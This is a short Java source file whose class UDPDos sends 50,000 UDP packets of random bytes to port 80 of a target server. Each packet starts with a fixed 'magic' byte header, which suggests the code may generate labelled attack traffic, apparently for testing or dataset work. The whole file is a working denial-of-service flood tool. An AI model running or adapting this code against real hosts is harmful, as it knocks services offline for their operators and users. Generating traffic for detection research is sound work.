package fr.contacgen;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;

public class UDPDos implements Runnable {
	private InetAddress server;
	private int amount = 50000;

	private long seed = 4276498;

	public UDPDos(InetAddress server) {
		this.server = server;
	}

	public UDPDos(InetAddress server, long seed) {
		this.server = server;
		this.seed = seed;
	}

	@Override
	public void run() {
		System.out.println("UDPDOS started on url: " + server);
		Random r = new Random(seed);
		while (amount > 0) {
			if(udpAttack(r)) amount--;
		}
		System.out.println("UDPDOS finished");
	}

	public static final byte[] MAGIC = new byte[] {48, -110, 100, 19, -30, 22, 1, 0};
	private boolean udpAttack(Random r) {
		int length = r.nextInt(500) + 50;
		byte[] buffer = new byte[length];

		r.nextBytes(buffer);
		System.arraycopy(MAGIC, 0, buffer, 0, MAGIC.length);

		DatagramPacket dataSent = new DatagramPacket(buffer, length, server, 80);
		try (DatagramSocket socket = new DatagramSocket()) {
			socket.send(dataSent);
		} catch (IOException e) {
			e.printStackTrace();
			return false;
		}
		return true;
	}

}
